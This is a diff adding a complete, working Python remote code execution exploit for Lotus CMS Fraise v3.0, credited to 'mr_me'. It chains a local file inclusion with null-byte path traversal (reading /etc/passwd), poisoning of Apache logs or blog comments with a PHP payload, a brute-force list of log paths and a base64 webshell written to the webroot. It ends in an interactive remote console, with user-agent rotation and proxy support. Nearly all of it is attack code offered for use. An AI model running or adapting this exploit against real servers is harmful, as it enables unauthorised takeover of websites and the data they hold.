@@ -1,0 +1,308 @@
+#!/usr/bin/python 
+# Lotus CMS Fraise v3.0 LFI - Remote Code Execution Exploit
+# greetz Tecr0C :0)
+#
+# Vuln: lines 15-23 in core/lib/router.php
+#---------- sof
+# //Get page request (if any)
+# $page = $this->getInputString("page", "index");
+#      
+# //Get plugin request (if any)
+# $plugin = $this->getInputString("system", "Page");
+#       
+# //If there is a request for a plugin
+# if(file_exists("core/plugs/".$plugin."Starter.php")){
+# 	//Include Page fetcher
+#       include("core/plugs/".$plugin."Starter.php");
+# --------- eof
+#
+# Additionally, the CMS allows an attacker to comment on blog posts which inturn will 
+# write a file on the remote disk with possibly 'malicious' content inside.
+#
+# exploit includes: 
+# - Proxy support
+# - Dynamic User-agent generation
+# - Apache access log and Lotus blog comment injection routines
+# - Custom shell creation and deletion
+# 
+# Environment:
+# Apache 2.2.14/PHP 5.3.2
+# php.ini -> magic_quotes_gpc = Off
+# 
+# Example:
+# [mr_me@pluto lotuscms]$ python luckylotus.py -c -i 1294585604 -p localhost:8080 -t 192.168.56.101 -d /webapps/lotus/lcms/
+#
+#	| -------------------------------------------- |
+#	| Lotus CMS v3.0 Remote Code Execution Exploit |
+#	| by mr_me - net-ninja.net ------------------- |
+#
+# (+) Exploiting target @: 192.168.56.101/webapps/lotus/lcms/
+# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
+# (+) Testing the file inclusion vulnerability.. file inclusion is working! 
+# (+) Writing comment.. comment shell written sucessfully
+# (+) Writing webshell d8e8fca2dc0f896fd7cb4cb0031ba249.php to the webroot..
+# (+) Entering interactive remote console (q for quit)
+#
+# mr_me@192.168.56.101# id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#
+# mr_me@192.168.56.101# uname -a
+# Linux steve-ubuntu 2.6.32-27-generic #49-Ubuntu SMP Wed Dec 1 23:52:12 UTC 2010 i686 GNU/Linux
+#
+# mr_me@192.168.56.101# q
+
+import sys, urllib, urllib2, socket, re, base64, getpass
+from optparse import OptionParser
+from random import choice
+
+usage = "./%prog [<options>] -t [target] -d [directory path]"
+usage += "\nExample 1: ./%prog -l -p localhost:8080 -t 192.168.56.101 -d /webapps/lotus/lcms/"
+usage += "\nExample 2: ./%prog -c -i 1294585604 -p localhost:8080 -t 192.168.56.101 -d /webapps/lotus/lcms/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="dirPath",
+                  help="Directory path to the CMS")
+parser.add_option("-i", type="string", action="store", dest="blogPostId",
+                  help="Blog Post ID that will be injected")
+parser.add_option("-l", action="store_true", dest="logInject",
+                  help="Code execution via apache access log")
+parser.add_option("-c", action="store_true", dest="blogComInject",
+                  help="Code execution via Blog comments")
+
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| -------------------------------------------- |"
+    print "\t| Lotus CMS v3.0 Remote Code Execution Exploit |"
+    print "\t| by mr_me - net-ninja.net ------------------- |\n"
+
+if len(sys.argv) < 5:
+	banner()
+	parser.print_help()
+	sys.exit(1)
+
+# variables
+exploit = "index.php?system="
+dDS = "../" * 10
+nB = "%00"
+sName = "d8e8fca2dc0f896fd7cb4cb0031ba249"
+phpShell = "<?php system(base64_decode($_GET[a]));?>"
+cmd = "&a="
+agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+        "Microsoft Internet Explorer/4.0b1 (Windows 95)",
+        "Opera/8.00 (Windows NT 5.1; U; en)"]
+agent = choice(agents)
+
+def getProxy():
+    try:
+        proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
+    except(socket.timeout):
+            print "\n(-) Proxy timed out"
+            sys.exit(1)
+    return proxy_handler
+	
+def getServerResponse(exploit):
+	if options.proxy:
+		try:
+			opener = urllib2.build_opener(getProxy())
+			opener.addheaders = [('User-agent', agent)]
+			check = opener.open(exploit).read()
+		except urllib2.HTTPError, error:
+                        check = error.read()
+			pass
+	else:
+		try:
+			req = urllib2.Request(exploit)
+                        req.addheaders = [('User-agent',agent)]
+			check = urllib2.urlopen(req).read()
+		except urllib2.HTTPError, error:
+			check = error.read()
+                        pass
+	return check
+
+def testFileInclusion():
+	sys.stdout.write("\n(+) Testing the file inclusion vulnerability.. ")
+	sys.stdout.flush()
+	testFile = "etc/passwd"
+	response = getServerResponse("http://" + options.target + options.dirPath + exploit + dDS + testFile + nB)
+	if re.findall("root:x:", response):
+		sys.stdout.write("file inclusion is working! \n")
+		sys.stdout.flush()
+	else:
+		sys.stdout.write("file inclusion failed..\n")
+		sys.stdout.flush()
+		print "(-) Exiting.."
+		sys.exit(1)
+
+def writeDirtyLog():
+	sys.stdout.write("(+) Poisoning the access log.. ")
+	sys.stdout.flush()
+        su = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+		su.connect((options.target,80))
+        except:
+		print "(-) Failed sending the shell to target %s" % options.target
+
+	junk = ("GET /hazStart"+phpShell+"hazEnd HTTP/1.1\r\nHost: "+options.target+"\r\nConnection: close\r\n\r\n")
+	su.send(junk)
+	su.close()
+	sys.stdout.write("log poisoned!\n")
+	sys.stdout.flush()
+
+def huntLogFiles():
+	foundLogs = []
+	logs = ["var/log/httpd/access_log",
+		"var/log/httpd/error_log",
+		"apache/logs/error.log",
+		"apache/logs/access.log",
+		"apache/logs/error.log",
+		"apache/logs/access.log",
+		"apache/logs/error.log",
+		"apache/logs/access.log",
+		"apache/logs/error.log",
+		"apache/logs/access.log",
+		"apache/logs/error.log",
+		"apache/logs/access.log",
+		"logs/error.log",
+		"logs/access.log",
+		"logs/error.log",
+		"logs/access.log",
+		"var/log/apache2/access.log",
+		"var/log/apache2/error.log",
+		"var/log/apache2/access_log",
+		"var/log/apache2/error_log",
+		"logs/error.log",
+		"logs/access.log",
+		"logs/error.log",
+		"logs/access.log",
+		"logs/error.log",
+		"logs/access.log",
+		"etc/httpd/logs/acces_log",
+		"etc/httpd/logs/acces.log",
+		"etc/httpd/logs/error_log",
+		"etc/httpd/logs/error.log",
+		"var/www/logs/access_log",
+		"var/www/logs/access.log",
+		"usr/local/apache/logs/access_log",
+		"usr/local/apache/logs/access.log",
+		"var/log/apache/access_log",
+		"var/log/apache/access.log",
+		"var/log/access_log",
+		"var/www/logs/error_log",
+		"var/www/logs/error.log",
+		"usr/local/apache/logs/error_log",
+		"usr/local/apache/logs/error.log",
+		"var/log/apache/error_log",
+		"var/log/apache/error.log",
+		"var/log/access_log",
+		"var/log/error_log"]	
+
+	for log in logs:
+		response = getServerResponse("http://"+options.target + options.dirPath + exploit + dDS + log + nB)
+		if re.search("hazStart", response):
+			print ("(+) Log file found @ location: %s" % (log))
+			foundLogs.append(log)
+	return foundLogs
+
+def writeLogWebShell(logFiles):
+	print ("(+) Writing webshell %s.php to the webroot.." % (sName))
+	cmd64 = base64.b64encode("echo \"<?php system(base64_decode(\$_GET['p'])); ?>\" > %s.php" % (sName))
+	for log in logFiles:
+		response = getServerResponse("http://"+options.target + options.dirPath + exploit + dDS + log + nB + cmd + cmd64)
+
+def interactiveAttack():
+	print "(+) Entering interactive remote console (q for quit)\n"
+	hn = "%s@%s# " % (getpass.getuser(), options.target)
+	preBaseCmd = ""
+	while preBaseCmd != 'q':
+		preBaseCmd = raw_input(hn)
+		cmd64 = base64.b64encode(preBaseCmd)
+		cmdResp = getServerResponse("http://"+options.target + options.dirPath + sName + ".php?p=" + cmd64)
+		print cmdResp
+	# suicide
+	rmShell = base64.b64encode("rm %s.php" % (sName))
+	cmdResp = getServerResponse("http://"+options.target + options.dirPath + sName + ".php?p=" + rmShell)
+	
+def testProxy():
+	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+	sys.stdout.flush()
+	opener = urllib2.build_opener(getProxy())
+	try:
+		check = opener.open("http://www.google.com").read()
+	except:
+		check = 0
+		pass
+	if check >= 1:
+		sys.stdout.write("proxy is found to be working!")
+		sys.stdout.flush()
+	else:
+		print "proxy failed, exiting.."
+		sys.exit(1)
+
+def writeDirtyComment():
+	sys.stdout.write("(+) Writing comment.. ")
+	sys.stdout.flush()
+	indexPage = "http://" + options.target + options.dirPath + "index.php"
+	if options.proxy:
+		try:
+			values = {'do' : 'comment', 'id' : options.blogPostId, 'name' : phpShell, 'website' : 'findme', 'message' : 'm'
+			, 'system' : 'Blog', 'post' : options.blogPostId }
+                        data = urllib.urlencode(values)
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			check = proxyfier.open(indexPage, data).read()
+
+		except:
+                       	print "(-) Proxy connection failed"
+                        sys.exit(1)
+	else:
+        	try:
+			values = {'do' : 'comment', 'id' : options.blogPostId, 'name' : phpShell, 'website' : 'findme', 'message' : 'm'
+                        , 'system' : 'Blog', 'post' : options.blogPostId }
+			data = urllib.urlencode(values)
+			req = urllib2.Request(indexPage, data)
+                        req.addheaders = [('User-agent',agent)]
+                        check = urllib2.urlopen(req).read()
+        	except:
+			print "(-) Target connection failed, check your address"
+			sys.exit(1)
+	sys.stdout.write("comment shell written sucessfully\n")
+	sys.stdout.flush()
+
+def writeCommentWebShell():
+	print ("(+) Writing webshell %s.php to the webroot.." % (sName))
+	cmd64 = base64.b64encode("echo \"<?php system(base64_decode(\$_GET['p'])); ?>\" > %s.php" % (sName))
+	ws = "http://" + options.target + options.dirPath + exploit + "../../data/modules/Blog/data/comments/" 
+	ws += options.blogPostId + ".txt" + nB + cmd + cmd64
+	response = getServerResponse(ws)
+
+if __name__ == "__main__":
+	banner()
+	print "(+) Exploiting target @: %s" % (options.target+options.dirPath)
+	if options.proxy:
+		testProxy()
+	testFileInclusion()
+	if options.logInject:
+		writeDirtyLog()
+		dirtyLogs = huntLogFiles()
+		if dirtyLogs > 0:
+			writeLogWebShell(dirtyLogs)
+		else:
+			print "(-) No log files found working."
+			sys.exit(1)
+	elif options.blogComInject:
+		if options.blogPostId:
+			writeDirtyComment()
+			writeCommentWebShell()
+		else:
+			print "(-) Missing Blog Post ID value. See the example.. exiting.."
+			sys.exit(1)
+	else:
+		print "(-) Arguments not set correctly, see the example.. exiting.."
+		sys.exit(1)
+	interactiveAttack()
